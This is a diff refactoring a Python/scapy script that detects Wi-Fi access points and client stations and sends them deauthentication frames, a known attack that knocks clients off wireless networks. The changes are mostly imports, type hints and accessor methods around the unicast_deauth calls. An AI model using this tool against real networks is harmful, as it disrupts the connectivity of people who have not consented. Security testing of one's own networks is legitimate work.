@@ -11,12 +11,13 @@
 # check for protected management frames
 
 import argparse
-from collections.abc import Iterator
+from collections import abc
 import multiprocessing
-from re import compile as re_compile
+import re
 from scapy import sendrecv
 from scapy.layers import dot11
 import sys
+import typing
 
 BROADCAST = 'ff:ff:ff:ff:ff:ff'
 DEAUTH_COUNT = 64
@@ -35,7 +36,7 @@ class MsgException(Exception):
         )
 
 class AccessPoints:
-    _bssid_regex = re_compile('^([0-9a-f]{2}:){5}[0-9a-f]{2}$')
+    _bssid_regex = re.compile('^([0-9a-f]{2}:){5}[0-9a-f]{2}$')
     
     def __init__(self, essid: str, bssids: str = None) -> None:
         self._essid = essid
@@ -46,7 +47,7 @@ class AccessPoints:
                 if self._bssid_regex.match(bssid):
                     self._bssids.add(bssid)
     
-    def __iter__(self) -> Iterator[str]:
+    def __iter__(self) -> abc.Iterator[str]:
         for bssid in self._bssids:
             yield bssid
     
@@ -65,11 +66,11 @@ class Stations:
         self._essid = essid
         self._bssids = {} # {bssid_sta: bssid_ap}
     
-    def get(self, bssid_sta: str) -> str | None:
+    def __getitem__(self, bssid_sta: str) -> typing.Optional[str]:
         return self._bssids.get(bssid_sta)
     
-    def update(self, bssid_sta: str, bssid_ap: str) -> None:
-        self._bssids.update({bssid_sta: bssid_ap})
+    def __setitem__(self, bssid_sta: str, bssid_ap: str) -> None:
+        self._bssids[bssid_sta] = bssid_ap
         print_info(
             f'STA detected for network {self._essid}'
             f'\n    station      = {bssid_sta}'
@@ -263,15 +264,15 @@ def handle_ctl_data(frame: dot11.Dot11, deauth_config: DeauthConfig,
             if (
                 is_unicast(bssid_dst) and
                 bssid_src in aps_targetlist and
-                stations.get(bssid_dst) != bssid_src
+                stations[bssid_dst] != bssid_src
             ):
-                stations.update(bssid_dst, bssid_src)
+                stations[bssid_dst] = bssid_src
                 unicast_deauth(deauth_config, bssid_dst, bssid_src, bssid_net)
             elif (
                 bssid_dst in aps_targetlist and
-                stations.get(bssid_src) != bssid_dst
+                stations[bssid_src] != bssid_dst
             ):
-                stations.update(bssid_src, bssid_dst)
+                stations[bssid_src] = bssid_dst
                 unicast_deauth(deauth_config, bssid_src, bssid_dst, bssid_net)
     except Exception as e:
         raise MsgException(e, 'ctl and/or data frames could not be processed')
